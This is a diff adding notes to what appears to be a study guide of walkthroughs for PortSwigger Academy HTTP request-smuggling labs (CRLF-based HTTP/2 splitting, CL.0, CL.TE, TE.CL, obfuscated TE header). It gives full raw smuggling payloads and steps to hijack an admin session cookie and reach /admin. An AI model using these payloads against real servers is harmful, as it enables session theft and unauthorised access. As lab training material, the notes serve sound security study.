@@ -11,6 +11,8 @@ In burp repeater what to change in settings to test `http/1` or `http/2`:
 
 ![image](https://github.com/user-attachments/assets/91c35df6-6961-421c-8179-4790ef2db1b8)
 
+(NOTE: To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the Shift + Return keys. Note that this feature is not available when you double-click on the header)
+
 
 ## Methodology
 
@@ -499,38 +501,157 @@ search=x
 - now we refresh the page and we can see it wrote the request as a recent search, getting the other users cookie value. (if in the response it's a `POST` you refreshed too early and need to try again to steal the users which should be a `GET` request):
 - ![image](https://github.com/user-attachments/assets/4097a559-1a3f-4181-b4f9-1d78ee9a8cd8)
 
+### HTTP/2 request splitting via CRLF injection
 
+Background:
 
+```
+ This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.
 
+To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.
 
+The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection. 
+```
 
+(NOTE: To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the Shift + Return keys. Note that this feature is not available when you double-click on the header)
 
+- send a request for `GET /` to repeater, make sure the repeater attributes are set to `http/2`
+- change the path to a non-existent endpoint such as `/x`
+- ![image](https://github.com/user-attachments/assets/11c0dac0-c1cd-401c-a9ca-fd623e1d54a8)
+- using inspector append the arbitrary header to the end of the request
+```
+Name:
+foo
+```
+```
+Value
+bar\r\n
+\r\n
+GET /x HTTP/1.1\r\n
+Host: YOUR-LAB-ID.web-security-academy.net
 
+```
 
+- ![image](https://github.com/user-attachments/assets/612fe85b-f163-44d2-96c2-c7a9cd191224)
+- repeat until we get a 302 with the users session cookie
+- send request like this until you get a `200` and see the admin panel, then delete carlos
 
+```
+GET /admin HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=STOLEN-SESSION-COOKIE
+```
 
+![image](https://github.com/user-attachments/assets/ac0d7147-2811-4d8c-bb78-c3974f1386f5)
 
+### CL.0 request smuggling
 
+Background
+```
+ This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the Content-Length header on requests to some endpoints.
 
+To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin, then delete the user carlos. 
+```
 
+- send the GET / request to Burp Repeater twice
+- add both of these into a tab in burp repeater
+- go to the first request and covert it to a `POST`, in the body of the POST request add an arbitrary request smuggling prefix
 
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
 
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
 
+- change the main POST request to point to an arbitrary endpoint that you want to test
+- in the send drop down, change the mode to `send group in sequence(single connection)`
+- change the connection header of the first request to `keep-alive`
+- send the sequence and check the responses, if the server responds to the second request as normal, this is not vulnerable, if it responds to the second request with a typical `404` this indicates that the back-end server is ignoring the `Content-Length` of requests
+- Deduce that you can use request for static files under `/resources` such as `/resources/images/blog.svg` to cause a CL.0 desync
 
+Exploitation
+- change the path of your smuggled prefix to point to /admin
 
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
 
+GET /admin HTTP/1.1
+Foo: x
+```
 
+- then just change it to include the deletion call `GET /admin/delete?username=carlos HTTP/1.1`
 
+### HTTP request smuggling, basic CL.TE vulnerability
 
+- issue the following request twice in burp
 
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
 
+0
 
+G
+```
 
+Note: You need to include the trailing sequence \r\n\r\n following the final 0
 
+### HTTP request smuggling, basic TE.CL vulnerability
 
+- send this twice in repeater
 
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
 
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
 
+x=1
+0
+```
 
+Note: You need to include the trailing sequence \r\n\r\n following the final 0
 
+### HTTP request smuggling, obfuscating the TE header
 
+- send twice in repeater
+
+```
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+Note: You need to include the trailing sequence \r\n\r\n following the final 0
